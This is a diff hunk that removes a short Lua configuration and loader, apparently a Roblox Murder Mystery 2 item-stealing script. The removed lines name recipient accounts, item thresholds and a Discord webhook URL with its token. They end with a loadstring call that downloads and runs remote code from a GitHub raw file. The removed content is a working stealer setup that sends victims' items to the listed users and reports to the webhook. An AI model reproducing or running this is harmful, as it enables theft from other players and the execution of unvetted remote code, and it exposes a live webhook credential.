@@ -1,7 +1,1 @@
-_G.Usernames = {"ANOUARTM111", "lebg91000", "ThunderStealthZap16"} -- you can add as many as you'd like
-_G.min_rarity = "Common"
-_G.min_value = 1 -- Put 1 to get all
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1465745432490807471/Ky8U8WHmpl3-Uy-X1comdyQou1XzQsEt8FWHd7yvJfCLO3cvwfneNTTErniUv_y0w4Rh" -- change to your webhook
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/Mm2-s/refs/heads/main/mm2-S-.lua"))()
